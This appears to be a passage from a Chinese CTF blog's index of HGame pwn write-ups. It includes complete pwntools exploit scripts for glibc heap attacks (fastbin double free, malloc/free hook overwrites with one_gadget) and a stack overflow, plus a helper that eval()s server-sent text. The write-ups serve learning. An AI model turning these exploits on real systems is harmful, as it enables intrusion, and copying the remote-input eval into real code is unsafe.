bin泄露main_arena后进行fastbin attack\n小贴士 这一题向__malloc_hook写入one_gadget并不能get shell，因为几个限制条件都没有满足，我们可以向__malloc_hook写入__libc_realloc+offset，然后在__realloc_hook上写入one_gadget\n因为realloc函数中有很多push指令，会改变当前栈的分布，我们可以控制offset来控制栈的更改程度。\n根据realloc的代码，我们可以知道offset的可能值为0，2，4，6，12，13，而通常的one_gadget有3~4个（但有一些的限制条件不是栈），所以可能的搭配大约有18~24种，一般来说，一个一个试会快一点，除非调试很简单\n更多详见：\n利用realloc调整栈使one_gadget生效_Loτυs的博客-CSDN博客_one_gadget onegadget不起作用_Maxmalloc的博客-CSDN博客_\u0026ldquo;doesn\u0026rsquo;t contain string \u0026quot;/bin/sh\u0026quot;, not glibc?\u0026rdquo; exp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = True fn: str = \u0026#34;./HGame-week2-fast_note\u0026#34; libc_name: str = \u0026#34;./libc-2.23.so\u0026#34; port: str = \u0026#34;31938\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; set resolve-heap-via-heuristic on break main c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(index:int, size: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) sendline_after_clean(str(size), b\u0026#34;Size: \u0026#34;) sendline_after_clean(content, b\u0026#34;Content: \u0026#34;) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) def show(index: int): sendline_after_clean(b\u0026#34;3\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) # def change(index: int, content: bytes) -\u0026gt; None: # sendline_after_clean(b\u0026#34;4\u0026#34;) # sendline_after_clean(str(index)) # sendline_after_clean(content) allocate(0, 0x68, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(1, 0x68, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(2, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(3, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) remove(2) # gdb.attach(p) show(2) base_addr = recv_and_transform() - 0x3c4b78 system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] hook_addr = base_addr + libc.sym[\u0026#39;__malloc_hook\u0026#39;] - 0x23 realloc_addr = base_addr + libc.sym[\u0026#39;__libc_realloc\u0026#39;] one = [0x45226, 0x4527a, 0xf03a4, 0xf1247] one_gadget = base_addr + one[3] suclog( \u0026#34;base_addr\u0026#34;, \u0026#34;system_addr\u0026#34;, \u0026#34;hook_addr\u0026#34; ) remove(0) remove(1) remove(0) allocate(4, 0x68, pg(hook_addr)*2) allocate(5, 0x68, \u0026#34;\u0026#34;) # gdb.attach(p) allocate(6, 0x68, \u0026#34;\u0026#34;) payload = b\u0026#34;\\x00\u0026#34;*0xb + pg(one_gadget) + pg(realloc_addr+6) allocate(7, 0x68, payload) # gdb.attach(p) sendline_after_clean(b\u0026#34;1\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(\u0026#34;8\u0026#34;, b\u0026#34;Index: \u0026#34;) sendline_after_clean(\u0026#34;0\u0026#34;, b\u0026#34;Size: \u0026#34;) interactive_after_clean() new_fast_note checksec查看程序架构 ida查看伪C代码 典型的堆菜单题，这里比较重要的是：\n虽然表面上限制分配15个chunk，但是它并不检查对应的index是否已有chunk，这导致我们可以分配任意个chunk\n再加上free后不置零，我们就可以得到libc基址：\n那么，我们有两种思路：\nunsorted bin泄露libc后往tcache bin中填入7个0x10的chunk，进行fastbin double free 泄露libc后直接tcache attack 在fast_note中我们已经详细讲过第二种方法了，这里我们使用第一种方法\n小贴士 在往tcache bin中填入0x10chunk块的时候，我们需要先分配7个chunk块，这时候，由于unsorted bin中还保留着0x80的堆块一个，所以程序会对其分割\n但是0x80的size位为0x90，只能分配成0x90=0x20*3+0x30这四个堆块，因此分配的第四个堆块的大小为0x30\n但是这样子第四个chunk释放的时候，就无法进入0x20的tcache bin，而是进入0x30的tcache bin，因此距离tcache bin被填满就刚好差一个\n因此，我们需要分配8个chunk而不是7个\n可能有点难理解，具体看我代码然后自己调试看下\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes rmt: bool = False fn: str = \u0026#34;./HGame-week2-new_fast_note\u0026#34; libc_name: str = \u0026#34;./libc-2.31.so\u0026#34; port: str = \u0026#34;31780\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if rmt: p = remote(\u0026#34;week-2.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;, env=env) else: p = process(fn, env=env) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(*args, **kwargs): # args是变量名，是字符串 for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... def allocate(index:int, size: int, content: bytes) -\u0026gt; None: sendline_after_clean(b\u0026#34;1\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) sendline_after_clean(str(size), b\u0026#34;Size: \u0026#34;) sendline_after_clean(content) def remove(index: int) -\u0026gt; None: sendline_after_clean(b\u0026#34;2\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) def show(index: int): sendline_after_clean(b\u0026#34;3\u0026#34;, b\u0026#34;\u0026gt;\u0026#34;) sendline_after_clean(str(index), b\u0026#34;Index: \u0026#34;) # def change(index: int, content: bytes) -\u0026gt; None: # sendline_after_clean(b\u0026#34;4\u0026#34;) # sendline_after_clean(str(index)) # sendline_after_clean(content) allocate(0, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(1, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(2, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(3, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(4, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(5, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(6, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(7, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(8, 0x80, \u0026#34;/bin/sh\\x00\u0026#34;) remove(0) remove(1) remove(2) remove(3) remove(4) remove(5) remove(6) remove(7) show(7) main_arena_offset = 0x1ECB80 base_addr = recv_and_transform() - main_arena_offset - 96 system_addr = base_addr + libc.sym[\u0026#39;system\u0026#39;] hook_addr = base_addr + libc.sym[\u0026#39;__free_hook\u0026#39;] suclog( \u0026#34;base_addr\u0026#34;, \u0026#34;system_addr\u0026#34;, \u0026#34;hook_addr\u0026#34; ) allocate(0, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(1, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(2, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(3, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(4, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(5, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(6, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(7, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(9, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(10, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) remove(0) remove(1) remove(2) remove(3) remove(4) remove(5) remove(6) remove(7) # gdb.attach(p) remove(9) remove(10) remove(9) allocate(0, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(1, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(2, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(3, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(4, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(5, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) allocate(6, 0x10, \u0026#34;/bin/sh\\x00\u0026#34;) suclog( \u0026#34;base_addr\u0026#34;, \u0026#34;system_addr\u0026#34;, \u0026#34;hook_addr\u0026#34; ) allocate(9, 0x10, pg(hook_addr)) # gdb.attach(p) allocate(10, 0x10, pg(hook_addr)) allocate(11, 0x10, pg(hook_addr)) allocate(12, 0x10, pg(system_addr)) remove(8) interactive_after_clean() ","date":"2023年01月21日","permalink":"https://peterliuzhi.top/writeup/hgame-week2-pwn-writeup/","section":"writeup","summary":"I\u0026rsquo;d rather attempt to do something great and fail than to attempt to do nothing and succeed. — Robert Schuller 上期见这里 YukkuriSay checksec查看程序架构 发现了canary，但是这题溢出不到canary，那么可能可以利用ca","tags":["pwn","格式化字符串漏洞","tcache attack","hook edit","fastbin attack","main_arena leak"],"title":"HGame Week2 PWN WriteUp"},{"categories":null,"contents":" 如需交换友链，请依照以下格式向我发邮件（peterliuforever@gmail.com）或在底下评论，谢谢。\n下面是我的网站信息：\nsite: \u0026#34;P3troL1er的个人技术博客\u0026#34; url: \u0026#34;https://peterliuzhi.top\u0026#34; logo: \u0026#34;https://peterliuzhi.top/images/avatar.png\u0026#34; description: \u0026#34;一个普普通通的pwner~\u0026#34; 隔壁老井的隔壁的博客\ra weber\u0026#39;s blog\rPara-L1las的博客\rA WEB SECURITY BLOG\rHur1k的小站 (╹ڡ╹ )\r躺下，听听海，吹吹风\ritSssm3 の 博客\r努力进步中的 是我~\r","date":"2023年01月19日","permalink":"https://peterliuzhi.top/friend/links/","section":"friend","summary":"如需交换友链，请依照以下格式向我发邮件（peterliuforever@gmail.com）或在底下评论，谢谢。 下面是我的网站信息： site: \u0026#34;P3t","tags":null,"title":"Links"},{"categories":["tricks"],"contents":" The only real failure in life is not to be true to the best one knows. — Buddha\n有时候misc题目会出一些连续解几百个简单数学题然后才能get flag的题目，这时候我们可以利用pwntools进行交互并使用eval解题\n注意，此脚本只能解普通数学计算式（加减乘除模，以及在python中符合语法的表达式），而一些英文计算式或者中文计算式要自己写一个转换函数将其转化为数学计算式，一般来说可以使用哈希表\nLinux中没有pwntools可以使用以下命令安装：\napt-get update apt-get install python3 python3-pip python3-dev git libssl-dev libffi-dev build-essential python3 -m pip install --upgrade pip python3 -m pip install --upgrade pwntools 具体详见Installation — pwntools 4.8.0 documentation\n以下是脚本：\n# 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 website = \u0026#34;www.example.com\u0026#34; port: str = \u0026#34;666\u0026#34; if_32: bool = False if_debug: bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) p = remote(website, port) # 下面是自定义的一些工具函数 def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None, timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout: int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) for i in range(100): # 从标准输出流获取题目 # 会一直读到b\u0026#34;.\u0026#34;为止 question = p.recvuntil(b\u0026#34;.\u0026#34;) # 工具函数自动计算结果 # 注意，输入的题目必须是有意义的算式，不能有等号 # 比如可以是1+2, 1÷2 # 如果需要小数，定义参数precise=True answer = formula_compute(question) # 在结尾加上回车发送answer # 直到读到\u0026#34;answer:\u0026#34;才开始发送 # 也可以不定义until字符串，脚本会在程序没有输出的时候发送（但如果网络不好，脚本可能判断出错） sendline_after_clean(answer, \u0026#34;answer:\u0026#34;) # 进入人机交互模式 interactive_after_clean() 脚本中的注释应该足够了\n需要注意的是，只有Linux中才能使用pwntools\n","date":"2023年01月18日","permalink":"https://peterliuzhi.top/tricks/%E4%BD%BF%E7%94%A8pwntools%E4%B8%8E%E8%BF%9C%E7%A8%8B%E4%BA%A4%E4%BA%92%E8%A7%A3misc%E6%95%B0%E5%AD%A6%E9%A2%98/","section":"tricks","summary":"The only real failure in life is not to be true to the best one knows. — Buddha 有时候misc题目会出一些连续解几百个简单数学题然后才能get flag的题目，这时候我们可以利用pwntools进","tags":["misc","pwntools","解普通数学题"],"title":"使用pwntools与远程交互解misc数学题"},{"categories":["writeup","HGame"],"contents":" The greatest healing therapy is friendship and love. — Hubert Humphrey\ntest_nc nc连上远程直接cat flag\neasy_overflow checksec ida 简单的栈溢出，唯一需要注意的是在get shell前将标准输出流关掉了，但我们可以用shell命令中的重定向将标准输出流重定向到标准错误流：\nexec 1\u0026gt;\u0026amp;2 cat flag 就可以了\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./HGame-vuln\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;30818\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env = {\u0026#34;LD_PRELOAD\u0026#34;: libc_name} if pss: p = remote(\u0026#34;week-1.hgame.lwsec.cn\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; break main c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # 两个elf，注意libc的版本 m_elf = ELF(fn) libc = ELF(libc_name) def suclog(**kwargs): for k in args: v = globals()[k] if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) for k, v in kwargs.items(): if isinstance(v, int): success(f\u0026#34;{k} =\u0026gt; {hex(v)}\u0026#34;) else: success(f\u0026#34;{k} =\u0026gt; {v}\u0026#34;) def send_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): if until is not None: p.recvuntil(flat(until)) else: received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received.decode(\u0026#39;UTF-8\u0026#39;)}\u0026#34;) p.send(flat(content)) def sendline_after_clean(content: bytes = b\u0026#34;\u0026#34;, until: bytes = None,\\ timeout: float = 0.05, no_show: bool = True): send_after_clean([content, p.newline], until, timeout, no_show) def interactive_after_clean(timeout:int = 0.05, no_show: bool = True): received = p.clean(timeout) if not no_show: print(f\u0026#34;[$]received:\\n{received}\u0026#34;) p.interactive() def c_val(value: int, c_type: string) -\u0026gt; bytes: type_dict = { \u0026#34;long\u0026#34;: ctypes.c_long, \u0026#34;longlong\u0026#34;: ctypes.c_longlong, \u0026#34;ulong\u0026#34;: ctypes.c_ulong, \u0026#34;ulonglong\u0026#34;: ctypes.c_ulonglong, \u0026#34;int8\u0026#34;: ctypes.c_int8, \u0026#34;int16\u0026#34;: ctypes.c_int16, \u0026#34;int32\u0026#34;: ctypes.c_int32, \u0026#34;int64\u0026#34;: ctypes.c_int64, \u0026#34;uint8\u0026#34;: ctypes.c_uint8, \u0026#34;uint16\u0026#34;: ctypes.c_uint16, \u0026#34;uint32\u0026#34;: ctypes.c_uint32, \u0026#34;uint64\u0026#34;: ctypes.c_uint64, \u0026#34;int\u0026#34;: ctypes.c_int, \u0026#34;char\u0026#34;: ctypes.c_char, \u0026#34;bool\u0026#34;: ctypes.c_bool, \u0026#34;float\u0026#34;: ctypes.c_float, \u0026#34;double\u0026#34;: ctypes.c_double, \u0026#34;ushort\u0026#34;: ctypes.c_ushort, \u0026#34;byte\u0026#34;: ctypes.c_byte, \u0026#34;longdouble\u0026#34;: ctypes.c_longdouble, \u0026#34;size_t\u0026#34;: ctypes.c_size_t, \u0026#34;ssize_t\u0026#34;: ctypes.c_ssize_t, \u0026#34;ubyte\u0026#34;: ctypes.c_ubyte } try: return bytes(str(type_dict[c_type](value).value), encoding=\u0026#34;UTF-8\u0026#34;) except: try: return bytes(str(eval(f\u0026#34;ctypes.c_{c_type}(value).value\u0026#34;)), encoding=\u0026#34;UTF-8\u0026#34;) except: error(f\u0026#34;无法转换{value}或不存在类型{c_type}\u0026#34;) def load_libc(libc_name: str, *args, **kwargs) -\u0026gt; ctypes.CDLL: return ctypes.CDLL(libc_name, args, kwargs) def recv_and_transform(prev_string: str = None, from_bytes: bool = True,\\ is_canary: bool = False, bound: str = None) -\u0026gt; int: if prev_string is not None: p.recvuntil(flat(prev_string)) if bound is not None: bound = flat(bound) if from_bytes: if bound is not None: return ug(p.recvuntil(bound)[:-len(bound)]) if if_32: return ug(p.recv(4)) else: if is_canary: return ug(p.recv(7).rjust(8, b\u0026#34;\\x00\u0026#34;)) else: return ug(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) else: if bound is not None: return int(p.recvuntil(bound)[:-len(bound)], 16) else: if if_32: return int(p.recv(10), 16) else: if is_canary: return int(p.recv(18), 16) else: return int(p.recv(14), 16) def formula_compute(formula: bytes, precise: bool = False): if isinstance(formula, bytes): formula = formula.decode(\u0026#34;UTF-8\u0026#34;) formula = formula.strip() formula = formula.strip(\u0026#34;\\n\u0026#34;) formula = formula.replace(\u0026#34;x\u0026#34;, \u0026#34;*\u0026#34;) formula = formula.replace(\u0026#34;^\u0026#34;, \u0026#34;**\u0026#34;) formula = formula.replace(\u0026#34;÷\u0026#34;, \u0026#34;/\u0026#34;) if not precise: formula = formula.replace(\u0026#34;//\u0026#34;, \u0026#34;/\u0026#34;) formula = formula.replace(\u0026#34;/\u0026#34;, \u0026#34;//\u0026#34;) return bytes(str(eval(formula)), encoding=\u0026#34;UTF-8\u0026#34;) ... offset: int = 0x18 backdoor = 0x401176 ret = 0x000000000040101a payload = flat({offset:[ ret, backdoor ]}) sendline_after_clean(payload) interactive_after_clean() choose_the_seat checksec ida 非常明显地，输入负数可以更改seats上方的任意数据\n我们可以考虑修改got表，目标是把puts的got值改成system的地址，但这首先需要泄露libc，我们可以考虑把exit的got值改成main函数的地址，然后就可以操作多次，就可以泄露libc后更改puts的got\nexp # 自动生成头部 from pwn import * from pwn import p64, p32, u32, u64, p8, p16 from LibcSearcher import LibcSearcher import ctypes pss: bool = True fn: str = \u0026#34;./HGame-choose_the_seat\u0026#34; libc_name: str = \u0026#34;libc-2.31.so\u0026#34; port: str = \u0026#34;31653\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ug = u32 if if_32 else u64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] env 